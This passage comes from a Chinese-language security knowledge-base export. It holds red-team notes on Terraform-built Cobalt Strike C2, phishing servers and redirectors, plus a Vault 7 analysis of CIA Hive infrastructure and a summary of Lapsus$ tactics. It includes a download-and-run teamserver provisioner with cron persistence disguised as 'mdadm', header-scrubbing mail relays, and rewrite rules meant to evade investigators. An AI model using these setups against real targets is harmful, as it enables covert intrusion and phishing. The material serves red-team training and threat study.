sshkeys：ssh登录凭证等信息\r\n- dns：DNS相关配置\r\n- firewalls：访问控制\r\n- outputs：基础设施的关键 IP 和域名信息\r\n\r\n# 4. 变量\r\nVariables.tf 存储诸如 API tokens、redirectors和 c2 域名、防火墙规则之类的内容：\r\n\r\n```\r\n  # tokens, api keys\r\n  variable \"do-token\" {\r\n      default = \"yourdigitaloceantoken\" }\r\n  \r\n  variable \"cf-token\" {\r\n      default = \"yourcloudflaretoken\" }\r\n  \r\n  variable \"cf-email\" {\r\n      default = \"xxx@xxx.com\" }\r\n  \r\n  # operator IPs\r\n  variable \"operator-ip\" {\r\n      default = \"aaa.bbb.ccc.ddd\" }\r\n  \r\n  # ssh keys\r\n  variable \"ssh-public-key\" {\r\n      default = \"/root/.ssh/id_rsa.pub\" }\r\n  \r\n  # domains & subdomains\r\n  variable \"domain-rdir\" {\r\n      default = \"example.com\" }\r\n  \r\n  variable \"domain-c2\" {\r\n      default = \"example.net\" }\r\n  \r\n  variable \"sub1\" {\r\n      default = \"static\" }\r\n  \r\n  variable \"sub2\" {\r\n      default = \"ads\" }\r\n  \r\n  variable \"sub3\" {\r\n      default = \"js\" }\r\n  \r\n  variable \"sub4\" {\r\n      default = \"css\" }\r\n  \r\n  variable \"sub5\" {\r\n      default = \"apple\" }\r\n  \r\n  variable \"sub6\" {\r\n      default = \"login\" }\r\n      \r\n  variable \"cspw\" {\r\n      default = \"somecrazystrongpasswordgoesherelel\" }\r\n```\r\n\r\n# 5. C2\r\n下面是 C2 服务器的 remote-exec Terraform 配置器，它下载 CS zip，使用给定的 CS 密码解压缩它并创建一个 cron 以确保 C2 服务器在服务器启动后启动：\r\n\r\n```\r\n  provisioner \"remote-exec\" {\r\n      inline = [\r\n          \"apt update\",\r\n          \"apt-get -y install zip default-jre\",\r\n          \"cd /opt; wget ${var.csDownloadUrl} -O cobaltstrike.zip\",\r\n          \"echo \\\"@reboot root cd /opt/cobaltstrike/; ./teamserver ${digitalocean_droplet.c2-http.ipv4_address} ${var.cspw}\\\" >> /etc/cron.d/mdadm\",\r\n          \"unzip -P ${var.cspw} cobaltstrike.zip && shutdown -r\"\r\n      ]\r\n    }\r\n```\r\n\r\n# 6. C2 Redirector\r\n使用 socat 将端口 80 和 443 上的所有传入流量重定向到运行 Cobalt Strike 团队服务器的主要 HTTP C2 服务器：\r\n\r\n```\r\n  provisioner \"remote-exec\" {\r\n      inline = [\r\n          \"apt update\",\r\n          \"apt-get -y install socat\",\r\n          \"echo \\\"@reboot root socat TCP4-LISTEN:80,fork TCP4:${digitalocean_droplet.c2-http.ipv4_address}:80\\\" >> /etc/cron.d/mdadm\",\r\n          \"echo \\\"@reboot root socat TCP4-LISTEN:443,fork TCP4:${digitalocean_droplet.c2-http.ipv4_address}:443\\\" >> /etc/cron.d/mdadm\",\r\n          \"shutdown -r\"\r\n      ]\r\n    }\r\n```\r\n\r\n测试 C2 及其Redirector\r\n\r\n- ![image-20230112232333800](/Users/mars/Library/Application Support/typora-user-images/image-20230112232333800.png)\r\n\r\n# 7. 钓鱼\r\n使用GoPhish 框架，开放端口 3333，但只允许使用 DigitalOcean 防火墙的操作员访问：\r\n\r\n```\r\n  resource \"digitalocean_firewall\" \"phishing\" {\r\n      name = \"phishing\"\r\n      droplet_ids = [\"${digitalocean_droplet.phishing.id}\"]\r\n  \r\n      inbound_rule = [\r\n          {\r\n              protocol = \"tcp\"\r\n              port_range = \"3333\"\r\n              source_addresses = [\"${var.operator-ip}\"]\r\n          }\r\n      ]\r\n      outbound_rule = [\r\n          {\r\n              protocol = \"tcp\"\r\n              port_range = \"25\"\r\n              destination_addresses = [\"${digitalocean_droplet.phishing-rdr.ipv4_address}\"]\r\n          }\r\n      ]\r\n  }\r\n```\r\n\r\n# 8. 钓鱼 Redirector\r\n这是最耗时的部分。 众所周知，设置 SMTP 服务器通常是一个非常痛苦的过程。 自动化部署的价值在于一旦它被发现并销毁，您将永远不需要从头开始重建 SMTP 服务器；设置包括：\r\n\r\n- SPF 记录\r\n- DKIM\r\n- 加密\r\n- postfix 配置为中继\r\n- 清理电子邮件标头以混淆原始电子邮件服务器\r\n\r\n测试钓鱼及其Redirector\r\n\r\n- 一旦基础设施建立起来，钓鱼相关的DNS 区域应该有 spf、dkim 和 dmarc 记录，类似于这里看到的那些：\r\n- ![5j8gR9](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/5j8gR9.jpg)\r\n- 完成 DNS 设置后，可以通过中继服务器从实际的钓鱼服务器向 gmail 发送快速测试电子邮件，看看 spf、dkim 和 dmarc 是否检查 PASS，我们可以在下面看到他们在我们的案例中所做的：\r\n\r\n```\r\n  telnet redteam.me 25\r\n  helo redteam.me\r\n  mail from: olasenor@redteam.me\r\n  rcpt to: mantvydo@gmail.com\r\n  data\r\n  to: Mantvydas Baranauskas <mantvydo@gmail.com>\r\n  from: Ola Senor <olasenor@redteam.me>\r\n  subject: daily report\r\n  \r\n  Hey Mantvydas,\r\n  As you were requesting last week - attaching as promised the documents needed to keep the project going forward.\r\n  .\r\n```\r\n\r\n- ![DCsD4o](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/DCsD4o.jpg)\r\n\r\n# 9. Payload Redirector\r\nPayload Redirector服务器建立在 apache2 mod_rewrite 和proxy模块上。 mod_rewrite 模块允许我们编写细粒度的 URL 重写规则，并将受害者的 HTTP 请求代理到合适位置。\r\n\r\n下面是一个 .htaccess 文件，说明何时、何地以及如何（即代理或重定向）重写传入的 HTTP 请求：\r\n\r\n```\r\n  RewriteEngine On\r\n  RewriteCond %{HTTP_USER_AGENT} \"android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos\" [NC]\r\n  RewriteRule ^.*$ http://payloadURLForMobiles/login [P]\r\n  RewriteRule ^.*$ http://payloadURLForOtherClients/%{REQUEST_URI} [P]\r\n```\r\n\r\n下面的截图应该说明了上述概念：\r\n\r\n- **绿色部分** - 我们使用了 curl（及其默认 UA），根据 .htaccess 文件，它应该将我们重定向到 payloadURLForOtherClients - 但因为它是一个测试主机且不可解析，所以失败了。\r\n- **粉红色部分** - 这次使用伪造的 UA，将 http 请求伪装成来自 iphone 的请求 - 我们可以看到 apache 正确地尝试将请求代理到 payloadURLForMobiles 主机。\r\n- ![pWlp0D](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/pWlp0D.jpg)\r\n\r\n# 10. Outputs\r\nOutputs.tf 包含了DNS 及其 IP 地址，也包括smtp相关的DKIM DNS TXT等信息：\r\n\r\n- ![w7l8ns](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/w7l8ns.jpg)\r\n- ![JPmM1s](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/JPmM1s.jpg)\r\n# 11. 参考资料\r\n- [https://www.ired.team/offensive-security/red-team-infrastructure/automating-red-team-infrastructure-with-terraform#configuring-infrastructure](https://www.ired.team/offensive-security/red-team-infrastructure/automating-red-team-infrastructure-with-terraform#configuring-infrastructure)"},{"fields":{"slug":"/安全知识库/Red Team基础设施/重定向器 Redirectors/","title":"重定向器 Redirectors"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 重定向器 Redirectors\r\ntags:\r\n- Red Team基础设施\r\n- 命令与控制 C2\r\n- DNS\r\n- SMTP\r\n- Redirector\r\n---\r\n\r\n# 1. SMTP\r\n配置SMTP是为了执行如下两个操作：\r\n\r\n- **1. Sendmail**\r\n\r\n  - 删掉之前的server headers，在/etc/mail/sendmail.mc结尾增加：\r\n\r\n    - ```define(`confRECEIVED_HEADER',`by $j ($v/$Z)$?r with $r$. id $i; $b')dnl```\r\n\r\n  - 在/etc/mail/access结尾增加：\r\n\r\n    ```\r\n    IP-to-Team-Server *TAB* RELAY\r\n    Phish-Domain *TAB* RELAY\r\n    ```\r\n\r\n  - 参考：\r\n\r\n    - [Removing Sender’s IP Address From Email’s Received From Header](https://www.devside.net/wamp-server/removing-senders-ip-address-from-emails-received-from-header)\r\n    - [Removing Headers from Postfix setup](https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/)\r\n\r\n  - **catch-all address：**把任何发送给*@phishdomain.com的邮件转发到到指定的邮件地址。\r\n\r\n    - ```echo PHISH-DOMAIN >> /etc/mail/local-host-names```\r\n\r\n  - 在/etc/mail/sendmail.mc的//Mailer Definitions//（结尾处）之前添加以下行：\r\n\r\n    - ```FEATURE(`virtusertable', `hash -o /etc/mail/virtusertable.db')dnl```\r\n\r\n  - 在/etc/mail/virtusertable结尾增加：\r\n\r\n    - ```@phishdomain.com  external-relay-address```\r\n\r\n- **2. Postfix**\r\n\r\n  - Postfix是替换Sendmail的一个更好的选择，还提供了更好的兼容性；Postfix还提供了全面的IMAP支持，使得测试人员能够实时地与对原始消息做出响应，，而不必依靠catch-all address。\r\n  - 配置参考：[Mail Servers Made Easy](https://blog.inspired-sec.com/archive/2017/02/14/Mail-Server-Setup.html)\r\n\r\n# 2. DNS\r\n![X37sEN](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/X37sEN.jpg)\r\n\r\n- **Socat**\r\n\r\n  - socat可将53端口上的DNS数据包重定向到我们的cs team server\r\n    - ```socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:<IPADDRESS>; echo -ne```\r\n  - 参考：[Redirecting Cobalt Strike DNS Beacons - Steve Borosh](https://medium.com/rvrsh3ll/redirecting-cobalt-strike-dns-beacons-e3dcdb5a8b9b)\r\n\r\n- **iptables**\r\n\r\n  - iptables转发DNS规则可以和我们的cs team server配合使用\r\n\r\n    ```\r\n    iptables -I INPUT -p udp -m udp --dport 53 -j ACCEPT\r\n    iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT \\\r\n    --to-destination <IP-GOES-HERE>:53\r\n    iptables -t nat -A POSTROUTING -j MASQUERADE\r\n    iptables -I FORWARD -j ACCEPT\r\n    iptables -P FORWARD ACCEPT\r\n    sysctl net.ipv4.ip_forward=1\r\n    ```\r\n\r\n- **DNS重定向也可以在NAT后面完成**\r\n\r\n  - 有时候可能需要在没有公网IP的内部网络上托管C2服务器，可以使用iptables、socat和反向SSH隧道的组合来实现。\r\n  - ![4xDzc7](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/4xDzc7.jpg)\r\n\r\n# 3. HTTP(S)\r\n- 实践可以参考 [[CIA 如何实现C&C基础设施]]\r\n\r\n- **socat**\r\n\r\n  - socat可用于将指定端口上的任何 TCP 数据包重定向到你的服务器。将localhost上的 TCP 端口 80 重定向到另一台主机上的端口 80 的基本语法是：\r\n    - ```socat TCP4-LISTEN:80,fork TCP4:<REMOTE-HOST-IP-ADDRESS>:80```\r\n  - 如果要指定网络接口，可以使用\r\n    - ```socat TCP4-LISTEN:80,bind=10.0.0.2,fork TCP4:1.2.3.4:80```\r\n\r\n- **iptables**\r\n\r\n  - 除了socat, iptables可以通过 NAT 执行dumb pipe重定向。 要将转向器的本地端口80转发到远程主机，配置命令如下：\r\n\r\n    ```\r\n      iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT\r\n      iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \\\r\n      --to-destination <REMOTE-HOST-IP-ADDRESS>:80\r\n      iptables -t nat -A POSTROUTING -j MASQUERADE\r\n      iptables -I FORWARD -j ACCEPT\r\n      iptables -P FORWARD ACCEPT\r\n      sysctl net.ipv4.ip_forward=1\r\n    ```\r\n\r\n- **SSH**\r\n\r\n  - 首先，必须设置GatewayPorts转发，否则将无法正常使用：\r\n\r\n    ```\r\n      # Allow the SSH client to specify which hosts may connect\r\n      GatewayPorts yes\r\n      \r\n      # Allow both local and remote port forwards\r\n      AllowTcpForwarding yes\r\n    ```\r\n\r\n  - 要将redirector的本地端口 80 转发到你的内部服务器，命令如下：\r\n\r\n    ```\r\n      tmux new -S redir80\r\n      ssh <redirector> -R *:80:localhost:80\r\n      Ctrl+B, D\r\n    ```\r\n\r\n  - 还可以转发多个端口，例如，同时打开 443 和 80：\r\n    id:: 624ed011-fe17-47ab-a287-cbab172044be\r\n\r\n    ```\r\n      tmux new -S redir80443\r\n      ssh <redirector> -R *:80:localhost:80 -R *:443:localhost:443\r\n      Ctrl+B, D\r\n    ```\r\n\r\n# 4. Payloads 与 Web\r\n- 当Payloads(服务)和网络资源开启时，我们希望降低被检测到的风险，同时希望无论是建立C2还是收集信息payload都能被高效的执行。\r\n- ![ImpMrv](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ImpMrv.jpg)\r\n- 下面是 Jeff Dimmock 关于Apache的mod_rewrite的用法和示例：\r\n  - Strengthen Your Phishing with Apache mod_rewrite https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/\r\n  - Invalid URI Redirection with Apache mod_rewrite https://bluescreenofjeff.com/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite/\r\n  - Operating System Based Redirection with Apache mod_rewrite https://bluescreenofjeff.com/2016-04-05-operating-system-based-redirection-with-apache-mod_rewrite/\r\n  - Combatting Incident Responders with Apache mod_rewrite https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/\r\n  - Expire Phishing Links with Apache RewriteMap https://bluescreenofjeff.com/2016-04-19-expire-phishing-links-with-apache-rewritemap/\r\n  - Apache mod_rewrite Grab Bag https://bluescreenofjeff.com/2016-12-23-apache_mod_rewrite_grab_bag/\r\n  - Serving Random Payloads with Apache mod_rewrite https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/\r\n- 其他Apache的mod_rewrite的用法和示例：\r\n  - mod_rewrite rule to evade vendor sandboxes from Jason Lang @curi0usjack https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10\r\n  - Serving random payloads with NGINX - Gist by jivoi https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9\r\n- 要在redirector上自动设置Apache的mod_rewrite，请看[Mod_Rewrite Automatic Setup](https://blog.inspired-sec.com/archive/2017/04/17/Mod-Rewrite-Automatic-Setup.html) and [the accompanying tool](https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup)\r\n\r\n# 5. C2重定向\r\n- 重定向 C2 流量有两个目的：1、隐藏后端真实服务器；2、躲避相关的调查者，让他们以为这是个合法网站。 通过使用Apache的mod_rewrite和自定义C2配置文件或其他代理（比如使用Flask），我们可以高效的过滤出来自调查 C2 的流量。\r\n\r\n  - Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite - Jeff Dimmock https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/\r\n  - Securing your Empire C2 with Apache mod_rewrite - Gabriel Mathenge (@_theVIVI) https://thevivi.net/2017/11/03/securing-your-empire-c2-with-apache-mod_rewrite/\r\n  - Expand Your Horizon Red Team – Modern SAAS C2 - Alex Rymdeko-Harvey (@killswitch-gui) https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/\r\n  - Hybrid Cobalt Strike Redirectors  https://zachgrace.com/2018/02/20/cobalt_strike_redirectors.html\r\n\r\n- 基于上述 “C2重定向”，另一种方法是可以在重定向服务器使用Apache的SSL代理引擎来接受入站SSL请求，并将这些请求代理到HTTPS listener上。 整个阶段使用SSL加密，可以根据需要在redirector上转发SSL证书。\r\n\r\n- 假如你已经使用了LetsEncrypt（aka CertBot），为了使mod_rewrite规则能够工作，需要在“/etc/apache2/sites-available/000-default-le-ssl.conf” 安装配置证书。 另外，要启用SSL ProxyPass引擎，相关配置如下：\r\n\r\n  ```\r\n    # Enable the Proxy Engine\r\n    SSLProxyEngine On\r\n    \r\n    # Tell the Proxy Engine where to forward your requests\r\n    ProxyPass / https://DESTINATION_C2_URL:443/\r\n    ProxyPassReverse / https://DESTINATION_C2_URL:443/\r\n    \r\n    # Disable Cert checking, useful if you're using a self-signed cert\r\n    SSLProxyCheckPeerCN off\r\n    SSLProxyCheckPeerName off\r\n    SSLProxyCheckPeerExpire off\r\n  ```\r\n\r\n# 6. 来源\r\n- [https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[CIA 如何实现C&C基础设施]: ../实践参考/CIA 如何实现C&C基础设施.md \"CIA 如何实现C&C基础设施\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/安全知识库/学习资源/Northern Kentucky University CSC 482 Computer Security/","title":"Northern Kentucky University CSC 482 Computer Security"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Northern Kentucky University CSC 482 Computer Security\r\ntags:\r\n- 学习资源\r\n---\r\n\r\n# 课程安排及课件\r\n* [https://faculty.cs.nku.edu/~waldenj/classes/2021/fall/csc482/schedule.html](https://faculty.cs.nku.edu/~waldenj/classes/2021/fall/csc482/schedule.html)"},{"fields":{"slug":"/安全知识库/学习资源/Stanford University CS 259D Data Mining for Cyber Security/","title":"Stanford University CS 259D Data Mining for Cyber Security"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Stanford University CS 259D Data Mining for Cyber Security\r\ntags:\r\n- 学习资源\r\n---\r\n\r\n# 课程安排及课件\r\n\r\n课程内容\r\n\r\n- 介绍\r\n- 僵尸网络\r\n- 内部威胁\r\n- 行为生物识别\r\n- **工业界分享：富国银行**\r\n- 网络安全\r\n- **工业界分享：三菱联合银行**\r\n- 机器学习对抗性攻击\r\n- 入侵检测系统\r\n- **工业界分享：Google安全数据挖掘**\r\n- 安全机器学习\r\n- 多态攻击\r\n- 钓鱼检测\r\n- 学生报告\r\n\r\n- 作业\r\n\r\n# 来源\r\n\r\n- [https://web.stanford.edu/class/cs259d/#lectures](https://web.stanford.edu/class/cs259d/#lectures)"},{"fields":{"slug":"/安全知识库/实践参考/CIA 如何实现C&C基础设施/","title":"CIA 如何实现C&C基础设施"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: CIA 如何实现C&C基础设施\r\ntags:\r\n- 实践参考\r\n- 命令与控制 C2\r\n- CIA\r\n---\r\n\r\n# 1. 背景\r\n\r\n​\tWikileaks 泄漏的资料 “Vault 7: CIA Hacking Tools Revealed” 有提到CIA是怎么做的。\r\n\r\n# 2. 整体架构\r\n\r\n![7VvK67](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/7VvK67.jpg)\r\n\r\n分为五个部分：\r\n\r\n- Implanted Host: 被控制的机器\r\n- VPS Server:  随时会销毁替换，隐藏真实C2\r\n- Proxy / VPN Server: 代理服务器，转发C2通信流量到C2服务器\r\n- Backend Server: 后台服务器\r\n- OSN: 存储日志的安全区\r\n\r\n其中：\r\n\r\n- Implanted Host到VPS Server 使用VPN连接（通过TLS加密）\r\n- VPS Server、Proxy / VPN Server、Backend Server和OSN之间的通信全部使用mTLS加密\r\n- 所有的VPS Server都是对公网提供服务的服务器（通常托管在空壳公司ISP）\r\n- Proxy / VPN Server 代理服务器负责过滤掉“无效”流量（如果mTLS认证失败则返回虚假网站 Cover Server）\r\n\r\nVPN可能使用的是OpenVPN，来自：\r\n\r\n![821soM](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/821soM.jpg)\r\n\r\n架构中的Proxy / VPN Server 代理服务器为Nginx，在系统中被称为“Switchblade”\r\n\r\n# 3. VPS Server\r\n\r\nVPS Server是红队基础设施的第一道防线，即用即抛和安全可靠是最重要的功能，它的iptables配置文件如下，也可参考 [[重定向器 Redirectors]]\r\n\r\n```\r\n  iptables -P INPUT DROP\r\n  iptables -P FORWARD DROP\r\n  iptables -p OUTPUT DROP\r\n  iptables -A INPUT -p tcp --dport 22 -j ACCEPT\r\n  iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT\r\n  DNAT\r\n  iptables -t nat -A PREROUTING -i eth0 -p tcp --sport 1024:65535 -d 10.3.2.174 --dport 53 -j DNAT --to-destination 172.16.63.101:443\r\n  iptables -t nat -A PREROUTING -i eth0 -p tcp --sport 1024:65535 -d 10.3.2.174 --dport 80 -j DNAT --to-destination 172.16.63.101:443\r\n  iptables -t nat -A PREROUTING -i eth0 -p tcp --sport 1024:65535 -d 10.3.2.174 --dport 443 -j DNAT --to-destination 172.16.63.101:443\r\n  FORWARDING\r\n  iptables -A FORWARD -i eth0 -o p3p2 -m state --state ESTABLISHED,RELATED -j ACCEPT\r\n  iptables -A FORWARD -i p3p2 -o eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT\r\n  iptables -A FORWARD -i eth0 -o p3p2 -p tcp --sport 1024:65535 -d 172.16.63.101 --dport 53 -m state --state NEW -j ACCEPT\r\n  iptables -A FORWARD -i eth0 -o p3p2 -p tcp --sport 1024:65535 -d 172.16.63.101 --dport 80 -m state --state NEW -j ACCEPT\r\n  iptables -A FORWARD -i eth0 -o p3p2 -p tcp --sport 1024:65535 -d 172.16.63.101 --dport 443 -m state --state NEW -j ACCEPT\r\n  SNAT\r\n  iptables -t nat -A POSTROUTING -o p3p2 -j MASQUERADE\r\n```\r\n\r\n# 4. Switchblade\r\n\r\nSwitchbalde 是与 Hive 和 Madison 等其他代理服务一起使用的身份验证代理服务器。Switchblade 使用自签名公钥证书与 Nginx 和 Linux Iptables相结合，将经过身份验证的数据传递给C2，未经身份验证的数据到虚假网站 Cover Server。\r\n\r\n架构图如下：\r\n\r\n![fkFu7a](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/fkFu7a.jpg)\r\n\r\n根据Wikileaks的另一份泄漏信息 [AmazonAtlas](https://wikileaks.org/amazon-atlas/) “Amazon是美国情报界领先的云提供商。2013 年，Amazon与CIA签订了一份价值 6 亿美元的合同，以构建一个云计算，供情报机构使用，以处理被列为绝密的信息”，其中右下角的“Protected Operational Network 受保护的运营网络”可能是AWS提供的专用网络区域。\r\n\r\nSwitchbalde的Nginx配置文件如下：\r\n\r\n```\r\n  # HTTPS server\r\n  server {\r\n          listen          172.16.63.113:443 ssl; \r\n          server_name     nginx.edb.devlan.net;\r\n          ssl_certificate                 /etc/nginx/certs/domainA/server.crt;\r\n          ssl_certificate_key             /etc/nginx/certs/domainA/server.key;\r\n          ssl_client_certificate          /etc/nginx/certs/domainA/ca.crt;\r\n          ssl_verify_client               optional;\r\n          ssl_verify_depth                2;\r\n          ssl_protocols                   TLSv1 TLSv1.1 TLSv1.2;\r\n          ssl_prefer_server_ciphers       on;\r\n                                                                                   \r\n          proxy_set_header        Host    $host:$proxy_port;                       \r\n          location / {                                                              \r\n                  if ($ssl_client_verify = SUCCESS) {                              \r\n                          proxy_pass   http://172.16.64.100:4098;                  \r\n                  }\r\n                  proxy_pass      http://172.16.64.12:44302;\r\n          }\r\n  }\r\n```\r\n\r\n# 5. 流量伪装（Resignaturing）\r\n\r\nCIA找了AFD对hive 2.5做了一次评测，以验证其通信流量是否会被外部检测出来，包括ICMP、TCP和UDP等协议，CIA也对这些协议做了一些修改（DNS和TFTP明文信息很多，所以暂未修改）\r\n\r\n- **ICMP**\r\n  - ![ZKQdsC](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ZKQdsC.jpg)\r\n- AFD发现前6字节是一个明显的检测特征；通过第1个字节的key对后面的IP进行XOR混淆，CIA对其进行了修改：XOR key为随机值（后续会变成更长的key）\r\n- **TCP 和 UDP**\r\n  - AFD并未发现明显的特征，但发现\r\n    - 存在固定的9个数据包序列，长度为：74-74-66-70-66-466-66-66-54，其中466为通信payload，其余为正常协议的长度。\r\n    - AFD还指出，这些数据包不符合各自的协议规范，可能会引起注意。\r\n  - CIA对数据包进行了如下修改：\r\n    - 数据包长度是随机的\r\n    - TCP和UDP使用相同的编码策略，见下图：\r\n      - ![gTQnir](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/gTQnir.jpg)\r\n\r\n# 6. 自毁机制 self delete\r\n\r\n用于确保任何处于休眠状态的 implanted 机器（未成功外连C2），在预定的时间内能有效地自毁，唯一残余的东西是是“配置文件” (.config) 和 /var 目录中留下的日志文件 (.log)。\r\n\r\n在正常操作期间，.log 文件是空的，其最后修改时间表示最后一次联系的时间，当 self-delete 执行时，Hive 二进制文件将从主机中删除，并使用格式 yymmddHHMMSS 的时间戳创建日志文件。 （插入文件的时间戳应该与文件的最后修改时间一致）\r\n\r\n自毁的算法伪代码如下：\r\n\r\n```\r\n  last_time = 0 [This is the initial condition.] Set last_time to current time.\r\n  If current time > (last_time + CHECK_INTERVAL) AND (current time - last_time) ≤ MAX_TIME_DIFF (1 minute), then the system time is OK. If the time anomaly counter > 0, decrement it by 1, otherwise, check the file configuration time Set last_time to current time.\r\n  If current time > (last_time + CHECK_INTERVAL) AND (current time - last_time) > MAX_TIME_DIFF, then the system time changed. Increment time anomaly counter. Set last_time to current time.\r\n  If the current time < last_time, then the system time changed. Increment time anomaly counter. Set last_time to current time.\r\n  If the time anomaly counter > TIME_ANOMALY_LIMIT, then self delete.\r\n```\r\n\r\n# 7. 参考\r\n\r\n- [https://byt3bl33d3r.substack.com/p/taking-the-pain-out-of-c2-infrastructure-3c4?s=r](https://byt3bl33d3r.substack.com/p/taking-the-pain-out-of-c2-infrastructure-3c4?s=r)\r\n- [https://wikileaks.org/vault7/document/hive-Operating_Environment/hive-Operating_Environment.pdf](https://wikileaks.org/vault7/document/hive-Operating_Environment/hive-Operating_Environment.pdf)\r\n- [https://wikileaks.org/vault7/document/hive-Infrastructure-Switchblade/hive-Infrastructure-Switchblade.pdf](https://wikileaks.org/vault7/document/hive-Infrastructure-Switchblade/hive-Infrastructure-Switchblade.pdf)\r\n- [https://wikileaks.org/vault7/document/hive-DevelopersGuide/hive-DevelopersGuide.pdf](https://wikileaks.org/vault7/document/hive-DevelopersGuide/hive-DevelopersGuide.pdf)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[重定向器 Redirectors]: ../Red Team基础设施/重定向器 Redirectors.md \"重定向器 Redirectors\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/安全知识库/实践参考/Lapsus$组织的手法/","title":"Lapsus$组织的手法"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Lapsus$组织的手法\r\ntags:\r\n- 实践参考\r\n- Lapsus$\r\n- 钓鱼\r\n- Microsoft\r\n---\r\n\r\n# 1. 微软报告\r\n\r\n3月22日，微软MSTIC、DART、MS365 Defender威胁情报团队发布了《DEV-0537 criminal actor targeting organizations for data exfiltration and destruction》报告，详细分析了攻击者的攻击手法（TTPs），并给出了安全建议\r\n\r\n攻击者收集了目标的大量信息，包括：组织架构、help desk，应急响应流程、供应链关系等，主要是用于发送钓鱼邮件，以及重置目标用户的凭证。手段包括：\r\n\r\n- 部署Redline Stealer恶意软件，窃取密码和session token\r\n- 购买凭证和session token\r\n- 向攻击目标企业（或供应商和合作伙伴）的员工购买证书和通过MFA认证\r\n- 在公共代码库中搜索公开凭据\r\n- 然后使用泄露的凭证或session token访问面向互联网的系统和应用，包括：VPN、RDP、VDI、Okta。\r\n\r\n对于使用MFA的目标企业，攻击者用两种技术突破MFA机制：session token replay and using stolen passwords\r\n\r\n- session token replay 会话令牌重放可能是实现MFA功能时不规范，代码机制在时效、范围时有错误。\r\n- using stolen passwords 是指窃取密码后，再钓鱼诱导受害者触发点击MFA认证通过的提示（二次认证的确认机制时get请求、csrf风险、或者提示不明显）。\r\n- 还有一个姿势是窃取员工的个人邮箱，通过个人账户做第二因素身份验证或密码恢复。\r\n\r\n通过招募目标企业员工成功进入攻击目标（员工提供身份凭据并通过MFA的提示，或者安装anydesk或其他远程管理软件）\r\n\r\n攻击者进入目标后，会访问JIRA、Gitlab和Confluence（用这些软件的企业是不是菊花一紧^_^），并尝试使用JIRA、Gitlab、Confluence的漏洞进行提权，以及使用DC Sync、Mimikatz、Ntdsutil\r\n\r\n攻击者拥有专门的 [[Red Team基础设施]] ，而且知道企业的安全检测规则（不同地理位置登录账户的检测），会选择地理上与目标相似的VPN出口，然后从目标下载敏感数据\r\n\r\n攻击者也会尝试攻击目标的云租户特权账户（AWS、Azure），并有创建账户和删除数据的行为\r\n\r\n攻击者还会监听组织应急响应处置和内部讨论（Slack、Teams、电话会议），深入了解被攻击者的心理状态\r\n\r\n# twitter网友爆料Mandiant给okta做的应急报告\r\n\r\nLapsus$居然用的都是常用、默认的工具，没有黑魔法，可见安全基础能力的重要性，很多公司地基没打好就开始造高楼了\r\n\r\n- ![UK3hmN](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/UK3hmN.jpg)\r\n- ![Nr8Pvg](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/Nr8Pvg.jpg)\r\n\r\n# 思考\r\n\r\n国外安全公司的文化就是会公开透明对待安全事件，这点难能可贵，我们也可以从中学到很多，此次LAPSUS$事件，相关公司也做了公开披露，参考\r\n\r\n- Cloudflare\r\n  - https://blog.cloudflare.com/cloudflare-investigation-of-the-january-2022-okta-compromise/\r\n- Okta\r\n  - https://www.okta.com/blog/2022/03/oktas-investigation-of-the-january-2022-compromise/\r\n\r\n其他事件的申明包括：\r\n\r\n- [[AWS 的 S3 故障回顾和思考]]\r\n- [Gitlab误删数据](https://about.gitlab.com/blog/2017/02/01/gitlab-dot-com-database-incident/)\r\n\r\n# 参考资料\r\n\r\n- 